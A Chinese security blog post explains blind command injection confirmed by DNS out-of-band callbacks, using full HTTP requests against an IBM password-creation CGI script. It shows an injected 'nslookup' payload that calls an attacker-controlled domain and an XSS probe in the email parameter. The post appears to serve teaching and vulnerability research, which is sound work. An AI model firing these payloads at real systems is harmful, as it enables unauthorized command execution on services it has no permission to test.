---
title: 通过DNS外带实现的命令注入
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495396&idx=1&sn=d58bfb8a8014b2164cd82704c100dad6&chksm=e8a5e487dfd26d91cfe7475e3642ad4229aaca7531af72f4c91fa531fa37bbbb076532d567c8&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-08-01
fetch_date: 2025-10-06T18:05:55.866845
---

# 通过DNS外带实现的命令注入

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj47bsozwbAta09tr7GRnokzPnJF0QMoTKmCPxhAmhPicpoZc7wtW0ppnrwxF3Q1TRMb4xonnPKLdgg/0?wx_fmt=jpeg)

# 通过DNS外带实现的命令注入

原创

richardo1o1

迪哥讲事

## 正文

正常请求:

正常情况下，email参数应仅包含合法的电子邮件地址，不应包含特殊字符或恶意代码。例如：

```
GET /cgi-bin/PasswordCreate.pl?email=example%40email.com&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com
```

请求URL为：

```
https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=example%40email.com&ibm-submit=Submit
```

可以转换为POST 请求：(bp里面右击可以自动转换)

```
POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=example%40email.com&ibm-submit=Submit
```

攻击请求 攻击请求包含恶意代码或命令，利用服务器处理不当的漏洞进行攻击。例如：

```
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com
```

此请求中，email参数包含了`<script>alert(1)</script>`，当被服务器处理并返回给用户时，会在用户浏览器中执行alert(1)脚本。

升级为命令注入：

```
POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22&ibm-submit=Submit
```

在此请求中，email参数被注入了`&nslookup "dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh" "86m.r87.me"`，会导致服务器执行nslookup命令。

当这个命令被执行时，系统会尝试查询`dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh.86m.r87.me`的DNS记录。攻击者可以在他们控制的DNS服务器（这里是 `r87.me`的DNS服务器）上接收查询请求，从而确认命令在目标服务器上被执行了。这种技术被称为“DNS外带”技术，是一种用于确认命令执行的常见方法。通过这种方式，攻击者可以在没有直接响应的情况下，仍能确认服务器执行了他们注入的命令。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过